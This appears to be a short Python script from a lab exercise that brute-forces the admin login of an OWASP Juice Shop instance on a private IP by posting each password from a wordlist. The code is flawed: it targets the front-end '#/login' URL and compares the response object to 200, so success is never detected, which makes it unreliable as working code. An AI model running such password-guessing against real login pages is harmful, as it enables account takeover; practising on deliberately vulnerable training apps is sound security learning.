#!/usr/bin/python3
from sys import argv

import requests

url = "http://10.10.253.120/#/login"

def login(email,password):
    req = requests.post(url,json={
		"email":email,
		"password":password,
		"submit": "Login",
    })
    return req


with open(argv[1],'r') as f:
	passwords = [line.strip() for line in f.read().split("\n") ]

for password in passwords:
    response = login("admin@juice-sh.op",password)
    
    if(response == 200):
        print(response.text)   
	
    print(f"{password}$$\n{response}")

